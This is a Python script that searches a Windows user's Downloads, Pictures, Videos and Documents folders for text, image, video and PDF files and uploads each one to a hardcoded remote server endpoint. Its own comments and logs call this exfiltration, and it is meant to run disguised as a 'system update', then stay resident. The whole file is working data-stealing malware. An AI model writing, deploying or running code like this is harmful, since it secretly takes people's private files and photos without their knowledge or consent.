import os
import time
import requests
import glob
import sys

# Hardcode URL as requested
SERVER_URL = "https://tu-app.up.railway.app" # User needs to replace with actual Railway app URL
UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"

# Log function for file logging
def log(message):
    try:
        with open('sync_log.txt', 'a') as f:
            f.write(f'[{time.ctime()}] {message}
')
    except Exception as e:
        print(f"Error writing to log file: {e}") # Print error to console if file logging fails

def run_exfiltration():
    print('Buscando archivos...') # Debug print
    log("Starting file exfiltration...")

    user_profile = os.environ.get('USERPROFILE', '')
    targets = [
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures'),
        os.path.join(user_profile, 'Videos'),
        os.path.join(user_profile, 'Documents')
    ]
    
    extensions = ['*.txt', '*.jpg', '*.png', '*.mp4', '*.pdf']
    
    for folder in targets:
        if not os.path.exists(folder): 
            log(f"Directory not found: {folder}. Skipping.")
            print(f"Directory not found: {folder}. Skipping.") # Debug print
            continue
        
        for ext in extensions:
            for file_path in glob.glob(os.path.join(folder, ext)):
                try:
                    # Evitar subir archivos demasiado grandes (ej: > 50MB)
                    if os.path.getsize(file_path) > 50 * 1024 * 1024:
                        log(f"Skipping large file: {file_path}")
                        print(f"Skipping large file: {file_path}") # Debug print
                        continue
                    
                    with open(file_path, 'rb') as f:
                        print(f'Enviando a {UPLOAD_ENDPOINT}...') # Debug print
                        files_payload = {'file': (os.path.basename(file_path), f.read())} # Use basename for filename
                        # agentId will be determined by the server or implicitly from the agent's context
                        response = requests.post(UPLOAD_ENDPOINT, files=files_payload)
                    
                    print(f'Respuesta: {response.status_code}') # Debug print
                    if response.status_code == 200:
                        log(f"Successfully exfiltrated {file_path}")
                        print(f"Successfully exfiltrated {file_path}") # Debug print
                    else:
                        log(f"Failed to exfiltrate {file_path}: HTTP {response.status_code} - {response.text}")
                        print(f"Failed to exfiltrate {file_path}: HTTP {response.status_code} - {response.text}") # Debug print
                except Exception as e:
                    log(f"Error processing/exfiltrating {file_path}: {e}")
                    print(f"Error processing/exfiltrating {file_path}: {e}") # Debug print

    log("File exfiltration complete.")
    print("Exfiltration complete.") # Debug print

if __name__ == "__main__":
    run_exfiltration()
    # Keep agent running for continuous exfiltration if needed, or exit
    # The current requirement is to run once as a "system update"
    while True:
        time.sleep(300) # Sleep for 5 minutes before trying again or exiting
